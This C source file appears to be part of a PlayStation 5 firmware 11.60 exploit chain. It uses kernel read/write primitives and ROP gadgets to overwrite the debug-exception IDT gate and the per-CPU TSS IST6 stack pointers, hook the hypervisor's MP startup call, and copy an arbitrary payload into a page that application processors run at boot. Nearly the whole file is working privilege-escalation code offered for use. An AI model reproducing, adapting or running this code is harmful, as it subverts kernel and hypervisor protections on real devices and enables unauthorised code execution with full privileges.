#include <stdio.h>
#include <stdint.h>
#include <string.h>

#include <ps5/kernel.h>

#include "resume_hook_1160.h"
#include "kdlsym.h"
#include "khook.h"
#include "util.h"

#define NCPU                    16
#define TSS_STRIDE              0x68ULL
#define IRET_OFF                0x20ULL
#define FRAME_OFF               0x28ULL
#define TOP_OFF                 0x50ULL
#define BLOCK_SIZE              0x100ULL

#define ARM_OFF                 0x1000ULL
#define ARM_CTX_OFF             0x100ULL
#define ARM_CONT_OFF            0x200ULL
#define FALLBACKS_OFF           0x1400ULL
#define HANDLER_OFF             0x2400ULL
#define AP_SOURCE_OFF           0x2800ULL
#define AP_COPY_SIZE            0xd00ULL
#define SAVE_OFF                0x3500ULL

#define SAVE_STATE              0x00ULL
#define SAVE_GATE_LO            0x08ULL
#define SAVE_GATE_HI            0x10ULL
#define SAVE_ISTS               0x18ULL

#define STATE_ARMED             0x313631314d524148ULL /* "HARM1161" */
#define AP_PAYLOAD_PAGE         0x3ffff000ULL
#define AP_MODE_1160            0x313631312d504142ULL /* "BAP-1161" */
#define CHAIN_MARK              0x434841494e2d3031ULL /* "CHAIN-01" */

_Static_assert((TOP_OFF & 0xf) == 0, "IST stack top must be aligned");
_Static_assert(FRAME_OFF + 0x28 == TOP_OFF,
               "privilege frame must end at the IST top");
_Static_assert(IRET_OFF + 8 == FRAME_OFF,
               "IRET trampoline must precede the frame");
_Static_assert(ARM_OFF + 0x400 <= FALLBACKS_OFF,
               "arm block overlaps fallbacks");
_Static_assert(FALLBACKS_OFF + 15 * BLOCK_SIZE <= HANDLER_OFF,
               "fallback blocks overlap handler");
_Static_assert(HANDLER_OFF + 0x400 <= AP_SOURCE_OFF,
               "handler overlaps AP source");
_Static_assert(AP_SOURCE_OFF + AP_COPY_SIZE <= SAVE_OFF,
               "AP source overlaps recovery state");
_Static_assert(SAVE_OFF + SAVE_ISTS + NCPU * sizeof(uint64_t) <=
                   RESUME_1160_RESULT_OFF,
               "saved state overlaps AP result");
_Static_assert(RESUME_1160_RESULT_OFF + 0x100 <= 0x4000,
               "AP result exceeds data cave");

static uint64_t tss_ist_slot(uint64_t tss_base, int cpu, int ist)
{
  return tss_base + (uint64_t)cpu * TSS_STRIDE + KH_TSS_IST(ist);
}

static void gate_encode(uint64_t target, uint16_t selector, uint8_t ist,
                        uint64_t *lo, uint64_t *hi)
{
  *lo = (target & 0xffffULL) | ((uint64_t)selector << 16) |
        ((uint64_t)(ist & 7) << 32) |
        ((uint64_t)KH_GATE_INTERRUPT << 40) | (1ULL << 47) |
        (((target >> 16) & 0xffffULL) << 48);
  *hi = (target >> 32) & 0xffffffffULL;
}

static int chain_q(uint8_t *buf, size_t *off, size_t cap, uint64_t value)
{
  if (*off + sizeof(value) > cap)
    return -1;
  memcpy(buf + *off, &value, sizeof(value));
  *off += sizeof(value);
  return 0;
}

static int chain_store(uint8_t *buf, size_t *off, size_t cap,
                       uint64_t target, uint64_t value)
{
  return chain_q(buf, off, cap, kgadget(KERNEL_GADGET_POP_RDI)) ||
         chain_q(buf, off, cap, target - 8) ||
         chain_q(buf, off, cap, kgadget(KERNEL_GADGET_POP_RCX)) ||
         chain_q(buf, off, cap, value) ||
         chain_q(buf, off, cap, kgadget(KERNEL_GADGET_STORE_RDI8_RCX));
}

static int verify_tss_layout(uint64_t tss_base, uint64_t saved[NCPU])
{
  uint64_t rsp0[NCPU];
  uint64_t ist4[NCPU];

  for (int cpu = 0; cpu < NCPU; cpu++) {
    uint64_t base = tss_base + (uint64_t)cpu * TSS_STRIDE;
    rsp0[cpu] = kread64(base + 0x04);
    ist4[cpu] = kread64(base + KH_TSS_IST(4));
    saved[cpu] = kread64(tss_ist_slot(tss_base, cpu, 6));
    if ((rsp0[cpu] >> 47) != 0x1ffffULL || !ist4[cpu] || saved[cpu])
      return -1;
    for (int prior = 0; prior < cpu; prior++)
      if (rsp0[cpu] == rsp0[prior] || ist4[cpu] == ist4[prior])
        return -1;
  }
  return 0;
}

static int restore_ists(uint64_t tss_base, const uint64_t saved[NCPU])
{
  int bad = 0;
  for (int cpu = 0; cpu < NCPU; cpu++)
    kwrite64(tss_ist_slot(tss_base, cpu, 6), saved[cpu]);
  for (int cpu = 0; cpu < NCPU; cpu++)
    if (kread64(tss_ist_slot(tss_base, cpu, 6)) != saved[cpu])
      bad++;
  return bad;
}

static int build_arm(uint8_t *arm, uint64_t arm_va, uint64_t hook_target,
                     uint64_t selected_ist, uint64_t handler_top)
{
  uint64_t ctx = arm_va + ARM_CTX_OFF;
  uint64_t cont = arm_va + ARM_CONT_OFF;
  size_t off = TOP_OFF;

  memset(arm, 0, 0x400);
  if (chain_q(arm, &off, 0x400, kgadget(KERNEL_GADGET_POP_RAX)) ||
      chain_q(arm, &off, 0x400, hook_target) ||
      chain_q(arm, &off, 0x400, kgadget(KERNEL_GADGET_POP_RDI)) ||
      chain_q(arm, &off, 0x400, ctx) ||
      chain_q(arm, &off, 0x400, kgadget(KERNEL_GADGET_DBREG_RESUME)) ||
      off > ARM_CTX_OFF)
    return -1;

  memcpy(arm + ARM_CTX_OFF + KH_RC_RSP,
         &(uint64_t){cont - 8}, sizeof(uint64_t));
  memcpy(arm + ARM_CTX_OFF + KH_RC_RIP,
         &(uint64_t){kgadget(KERNEL_GADGET_RET_TRAMP)}, sizeof(uint64_t));
  memcpy(arm + ARM_CTX_OFF + KH_RC_DR7,
         &(uint64_t){KH_DR7_BP0_EXEC}, sizeof(uint64_t));

  off = ARM_CONT_OFF;
  if (chain_q(arm, &off, 0x400, kgadget(KERNEL_GADGET_POP_RDI)) ||
      chain_q(arm, &off, 0x400, selected_ist - 8) ||
      chain_q(arm, &off, 0x400, kgadget(KERNEL_GADGET_POP_RCX)) ||
      chain_q(arm, &off, 0x400, handler_top) ||
      chain_q(arm, &off, 0x400,
              kgadget(KERNEL_GADGET_STORE_RDI8_RCX)) ||
      chain_q(arm, &off, 0x400, kgadget(KERNEL_GADGET_IRETQ)))
    return -1;
  off += 5 * sizeof(uint64_t);
  return off <= 0x400 ? 0 : -1;
}

static int build_passthrough(uint8_t *buf, uint64_t buf_va,
                             uint64_t stock_db_handler)
{
  uint64_t forward = buf_va + IRET_OFF;
  size_t off = TOP_OFF;

  memset(buf, 0, BLOCK_SIZE);
  /* Forward an unexpected foreign-core #DB to the stock handler with the
   * original five-qword interrupt frame, rather than swallowing or retrapping
   * a TF/debug event with a bare IRET. */
  memcpy(buf + IRET_OFF, &stock_db_handler, sizeof(stock_db_handler));
  return chain_q(buf, &off, BLOCK_SIZE,
                 kgadget(KERNEL_GADGET_POP_RSP)) ||
         chain_q(buf, &off, BLOCK_SIZE, forward);
}

static int build_handler(uint8_t *handler, uint64_t handler_va,
                         uint64_t cave, uint64_t db_gate,
                         uint64_t saved_gate_lo, uint64_t cr3,
                         uint64_t scan_lo, uint64_t scan_hi)
{
  uint64_t trampoline = handler_va + IRET_OFF;
  uint64_t payload_va = kdldmap(AP_PAYLOAD_PAGE);
  uint64_t oracle = cave + KH_OFF_USER;
  size_t save_addr_off, restore_rdi_off;
  size_t off = TOP_OFF;

  memset(handler, 0, 0x400);
  memcpy(handler + IRET_OFF,
         &(uint64_t){kgadget(KERNEL_GADGET_IRETQ)}, 8);

  if (chain_q(handler, &off, 0x400,
              kgadget(KERNEL_GADGET_MOV_RAX_RDI)) ||
      chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RCX)))
    return -1;
  save_addr_off = off;
  if (chain_q(handler, &off, 0x400, 0) ||
      chain_q(handler, &off, 0x400,
              kgadget(KERNEL_GADGET_ST_RCX_RAX)) ||
      chain_store(handler, &off, 0x400, db_gate, saved_gate_lo) ||
      chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RAX)) ||
      chain_q(handler, &off, 0x400, 0) ||
      chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_SET_DR7)) ||
      chain_store(handler, &off, 0x400, oracle + 0x20, CHAIN_MARK))
    return -1;

  /* The AP image is copied only after the stock gate and DR7 are restored. */
  if (chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_CLD)) ||
      chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RDI)) ||
      chain_q(handler, &off, 0x400, payload_va) ||
      chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RSI)) ||
      chain_q(handler, &off, 0x400, cave + AP_SOURCE_OFF) ||
      chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RCX)) ||
      chain_q(handler, &off, 0x400, AP_COPY_SIZE) ||
      chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_REP_MOVSB)))
    return -1;

#define STORE_PARAM(offset, value)                                            \
  do {                                                                        \
    if (chain_store(handler, &off, 0x400,                                    \
                    kdldmap(AP_PAYLOAD_PAGE + (offset)), (value)))           \
      return -1;                                                              \
  } while (0)
  STORE_PARAM(0xf00, kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  STORE_PARAM(0xf08, kdldmap(0));
  STORE_PARAM(0xf10, oracle);
  STORE_PARAM(0xf18, scan_lo);
  STORE_PARAM(0xf20, cave + RESUME_1160_RESULT_OFF);
  STORE_PARAM(0xf28, payload_va);
  STORE_PARAM(0xf30, cr3);
  STORE_PARAM(0xf38, AP_MODE_1160);
  STORE_PARAM(0xf40, scan_hi);
#undef STORE_PARAM

  if (chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RDI)))
    return -1;
  restore_rdi_off = off;
  if (chain_q(handler, &off, 0x400, 0) ||
      chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RSI)) ||
      chain_q(handler, &off, 0x400, payload_va) ||
      chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RDX)) ||
      chain_q(handler, &off, 0x400, cr3) ||
      chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RSP)) ||
      chain_q(handler, &off, 0x400, trampoline))
    return -1;

  memcpy(handler + save_addr_off,
         &(uint64_t){handler_va + restore_rdi_off}, 8);
  return off <= 0x400 ? 0 : -1;
}

__attribute__((noinline))
static void arm_and_return(uint64_t db_gate, uint64_t gate_lo,
                           uint64_t arm_ctx, uint64_t return_frame)
{
  uint64_t rsp, rbx, rbp, r12, r13, r14, r15;
  void *resume_label = &&resumed;

  __asm__ volatile("mov %%rsp,%0" : "=r"(rsp));
  __asm__ volatile("mov %%rbx,%0" : "=r"(rbx));
  __asm__ volatile("mov %%rbp,%0" : "=r"(rbp));
  __asm__ volatile("mov %%r12,%0" : "=r"(r12));
  __asm__ volatile("mov %%r13,%0" : "=r"(r13));
  __asm__ volatile("mov %%r14,%0" : "=r"(r14));
  __asm__ volatile("mov %%r15,%0" : "=r"(r15));

  kwrite64(arm_ctx + 0x00, r15);
  kwrite64(arm_ctx + 0x08, r14);
  kwrite64(arm_ctx + 0x10, r13);
  kwrite64(arm_ctx + 0x18, r12);
  kwrite64(arm_ctx + KH_RC_RBP, rbp);
  kwrite64(arm_ctx + KH_RC_RSP, return_frame - 7 * sizeof(uint64_t));
  kwrite64(arm_ctx + 0x30, rbx);
  kwrite64(arm_ctx + KH_RC_RIP, kgadget(KERNEL_GADGET_RET_TRAMP));

  kwrite64(return_frame + 0x00, (uint64_t)resume_label);
  kwrite64(return_frame + 0x08, KH_USER_CS);
  kwrite64(return_frame + 0x10, KH_RFLAGS_USER);
  kwrite64(return_frame + 0x18, rsp);
  kwrite64(return_frame + 0x20, KH_USER_SS);

  /* Publish the gate last and immediately trigger the bounded TF path. */
  kwrite64(db_gate, gate_lo);
  __asm__ volatile("pushfq\n\t"
                   "orq $0x100, (%%rsp)\n\t"
                   "popfq\n\t"
                   "nop\n\t"
                   ::: "memory", "cc");
resumed:
  return;
}

int resume_hook_1160_is_armed(uint64_t cave)
{
  return kread64(cave + SAVE_OFF + SAVE_STATE) == STATE_ARMED;
}

int resume_hook_1160_arm(uint64_t cave, uint64_t cr3,
                         uint64_t scan_lo, uint64_t scan_hi,
                         const uint8_t *payload, size_t payload_len)
{
  uint64_t tss_base = kdlsym(KERNEL_SYM_COMMON_TSS);
  uint64_t db_gate = kdlsym(KERNEL_SYM_IDT_ARRAY) + 16 * KH_VEC_DB;
  uint64_t save = cave + SAVE_OFF;
  uint64_t arm_va = cave + ARM_OFF;
  uint64_t handler_va = cave + HANDLER_OFF;
  uint64_t target = kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL);
  uint64_t stock_db_handler;
  uint64_t saved_gate_lo, saved_gate_hi, gate_lo, gate_hi;
  uint64_t saved_ist[NCPU];
  uint8_t arm[0x400], handler[0x400], fallback[BLOCK_SIZE];
  uint8_t verify[0x400], staged[AP_COPY_SIZE];
  int bad = 0;

  if (kernel_get_fw_version() != RESUME_1160_FW_RAW ||
      !payload || !payload_len || payload_len > sizeof(staged) ||
      scan_lo >= scan_hi || (scan_lo & 0xfff) || (scan_hi & 0xfff) ||
      resume_hook_1160_is_armed(cave))
    return -1;

  saved_gate_lo = kread64(db_gate);
  saved_gate_hi = kread64(db_gate + 8);
  stock_db_handler = (saved_gate_lo & 0xffffULL) |
                     (((saved_gate_lo >> 48) & 0xffffULL) << 16) |
                     ((saved_gate_hi & 0xffffffffULL) << 32);
  if (!((saved_gate_lo >> 47) & 1) ||
      ((saved_gate_lo >> 32) & 7) != 4 ||
      stock_db_handler < ktext(0) ||
      stock_db_handler >= ktext(0) + KH_KIMG_MAX ||
      verify_tss_layout(tss_base, saved_ist))
    return -2;
  gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET),
              (uint16_t)(saved_gate_lo >> 16), 6, &gate_lo, &gate_hi);
  if (gate_hi != saved_gate_hi)
    return -3;

  memset(staged, 0, sizeof(staged));
  memcpy(staged, payload, payload_len);
  kwrite(cave + AP_SOURCE_OFF, staged, sizeof(staged));
  for (size_t checked = 0; checked < sizeof(staged);
       checked += sizeof(verify)) {
    size_t chunk = sizeof(staged) - checked;
    if (chunk > sizeof(verify))
      chunk = sizeof(verify);
    memset(verify, 0, sizeof(verify));
    kread(cave + AP_SOURCE_OFF + checked, verify, chunk);
    if (memcmp(verify, staged + checked, chunk))
      return -4;
  }

  if (build_arm(arm, arm_va, target,
                tss_ist_slot(tss_base, 0, 6),
                handler_va + TOP_OFF) ||
      build_handler(handler, handler_va, cave, db_gate, saved_gate_lo,
                    cr3, scan_lo, scan_hi))
    return -5;
  kwrite(arm_va, arm, sizeof(arm));
  kwrite(handler_va, handler, sizeof(handler));
  memset(verify, 0, sizeof(verify));
  kread(arm_va, verify, sizeof(arm));
  if (memcmp(verify, arm, sizeof(arm)))
    return -6;
  memset(verify, 0, sizeof(verify));
  kread(handler_va, verify, sizeof(handler));
  if (memcmp(verify, handler, sizeof(handler)))
    return -6;

  for (int cpu = 1; cpu < NCPU; cpu++) {
    uint64_t va = cave + FALLBACKS_OFF + (uint64_t)(cpu - 1) * BLOCK_SIZE;
    if (build_passthrough(fallback, va, stock_db_handler))
      return -7;
    kwrite(va, fallback, sizeof(fallback));
    memset(verify, 0, sizeof(fallback));
    kread(va, verify, sizeof(fallback));
    if (memcmp(verify, fallback, sizeof(fallback)))
      return -7;
  }

  kwrite64(save + SAVE_GATE_LO, saved_gate_lo);
  kwrite64(save + SAVE_GATE_HI, saved_gate_hi);
  for (int cpu = 0; cpu < NCPU; cpu++)
    kwrite64(save + SAVE_ISTS + (uint64_t)cpu * 8, saved_ist[cpu]);
  if (kread64(save + SAVE_GATE_LO) != saved_gate_lo ||
      kread64(save + SAVE_GATE_HI) != saved_gate_hi)
    return -8;
  for (int cpu = 0; cpu < NCPU; cpu++)
    if (kread64(save + SAVE_ISTS + (uint64_t)cpu * 8) != saved_ist[cpu])
      return -8;
  kwrite64(save + SAVE_STATE, STATE_ARMED);
  if (kread64(save + SAVE_STATE) != STATE_ARMED)
    return -8;

  kwrite64(tss_ist_slot(tss_base, 0, 6), arm_va + TOP_OFF);
  for (int cpu = 1; cpu < NCPU; cpu++) {
    uint64_t top = cave + FALLBACKS_OFF +
                   (uint64_t)(cpu - 1) * BLOCK_SIZE + TOP_OFF;
    kwrite64(tss_ist_slot(tss_base, cpu, 6), top);
  }
  for (int cpu = 0; cpu < NCPU; cpu++) {
    uint64_t want = cpu == 0
                        ? arm_va + TOP_OFF
                        : cave + FALLBACKS_OFF +
                              (uint64_t)(cpu - 1) * BLOCK_SIZE + TOP_OFF;
    if (kread64(tss_ist_slot(tss_base, cpu, 6)) != want)
      bad++;
  }
  if (bad) {
    if (restore_ists(tss_base, saved_ist))
      return -10;
    kwrite64(save + SAVE_STATE, 0);
    if (kread64(save + SAVE_STATE) != 0)
      return -10;
    return -9;
  }

  printf("[11.60] resume hook: 16 isolated IST6 paths verified\n");
  arm_and_return(db_gate, gate_lo, arm_va + ARM_CTX_OFF,
                 arm_va + ARM_CONT_OFF + 6 * sizeof(uint64_t));
  return 0;
}

int resume_hook_1160_cleanup(uint64_t cave)
{
  uint64_t tss_base = kdlsym(KERNEL_SYM_COMMON_TSS);
  uint64_t db_gate = kdlsym(KERNEL_SYM_IDT_ARRAY) + 16 * KH_VEC_DB;
  uint64_t save = cave + SAVE_OFF;
  uint64_t saved_ist[NCPU];
  uint64_t saved_gate_lo, saved_gate_hi;
  int bad;

  if (!resume_hook_1160_is_armed(cave))
    return -1;
  saved_gate_lo = kread64(save + SAVE_GATE_LO);
  saved_gate_hi = kread64(save + SAVE_GATE_HI);
  for (int cpu = 0; cpu < NCPU; cpu++)
    saved_ist[cpu] = kread64(save + SAVE_ISTS + (uint64_t)cpu * 8);

  kwrite64(db_gate + 8, saved_gate_hi);
  kwrite64(db_gate, saved_gate_lo);
  bad = restore_ists(tss_base, saved_ist);
  if (kread64(db_gate) != saved_gate_lo ||
      kread64(db_gate + 8) != saved_gate_hi || bad)
    return -2;
  kwrite64(save + SAVE_STATE, 0);
  return kread64(save + SAVE_STATE) == 0 ? 0 : -3;
}
